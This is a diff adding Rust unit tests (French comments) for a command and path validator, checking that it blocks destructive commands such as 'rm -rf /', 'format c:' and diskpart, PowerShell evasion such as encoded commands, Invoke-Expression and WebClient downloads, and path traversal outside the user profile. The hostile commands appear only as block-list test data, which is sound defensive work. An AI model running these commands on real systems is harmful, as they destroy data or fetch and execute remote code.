@@ -66,3 +66,97 @@ pub fn check_path(path: &str) -> Result<()> {
 
     Ok(())
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::sync::Mutex;
+
+    // check_path lit USERPROFILE : on sérialise les tests qui mutent l'env
+    // pour éviter les courses entre threads de test.
+    static ENV_LOCK: Mutex<()> = Mutex::new(());
+
+    // ─── check_command ─────────────────────────────────────────
+
+    #[test]
+    fn command_allows_benign() {
+        assert!(check_command("git status").is_ok());
+        assert!(check_command("cargo build --release").is_ok());
+        assert!(check_command("Get-ChildItem C:\\Users").is_ok());
+    }
+
+    #[test]
+    fn command_blocks_destructive_patterns() {
+        for cmd in [
+            "rm -rf /",
+            "format c:",
+            "del /s /f /q c:\\",
+            "rd /s /q c:\\",
+            "shutdown /s /t 0",
+            "reg delete hklm\\software",
+            "bcdedit /set testsigning on",
+            "diskpart /s script.txt",
+            "net user administrator P@ss",
+        ] {
+            assert!(check_command(cmd).is_err(), "aurait dû être bloqué: {cmd}");
+        }
+    }
+
+    #[test]
+    fn command_blocks_powershell_evasion() {
+        for cmd in [
+            "powershell -enc SQBFAFgA",
+            "Invoke-Expression $payload",
+            "(New-Object Net.WebClient).DownloadString('http://x')",
+            "powershell -ExecutionPolicy Bypass -File x.ps1",
+        ] {
+            assert!(check_command(cmd).is_err(), "aurait dû être bloqué: {cmd}");
+        }
+    }
+
+    #[test]
+    fn command_blocklist_is_case_insensitive() {
+        assert!(check_command("RM -RF /").is_err());
+        assert!(check_command("FORMAT C:").is_err());
+        assert!(check_command("Invoke-EXPRESSION x").is_err());
+    }
+
+    #[test]
+    fn command_rejects_overlong() {
+        let at_limit = "a".repeat(MAX_COMMAND_LEN);
+        assert!(check_command(&at_limit).is_ok());
+        let over = "a".repeat(MAX_COMMAND_LEN + 1);
+        assert!(check_command(&over).is_err());
+    }
+
+    // ─── check_path ────────────────────────────────────────────
+
+    #[test]
+    fn path_blocks_traversal() {
+        let _g = ENV_LOCK.lock().unwrap();
+        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
+        assert!(check_path("C:\\Users\\testuser\\..\\Windows\\evil.dll").is_err());
+        assert!(check_path("C:/Users/testuser/../../secret").is_err());
+    }
+
+    #[test]
+    fn path_allows_user_profile_and_temp() {
+        let _g = ENV_LOCK.lock().unwrap();
+        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
+        assert!(check_path("C:\\Users\\testuser\\Documents\\note.txt").is_ok());
+        // Insensible à la casse et aux séparateurs
+        assert!(check_path("c:/users/TESTUSER/x.txt").is_ok());
+
+        let temp_file = std::env::temp_dir().join("catdesk-test.txt");
+        assert!(check_path(&temp_file.to_string_lossy()).is_ok());
+    }
+
+    #[test]
+    fn path_blocks_outside_allowed_roots() {
+        let _g = ENV_LOCK.lock().unwrap();
+        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
+        assert!(check_path("C:\\Windows\\System32\\cmd.exe").is_err());
+        assert!(check_path("C:\\Users\\autre\\doc.txt").is_err());
+        assert!(check_path("D:\\data\\x.txt").is_err());
+    }
+}
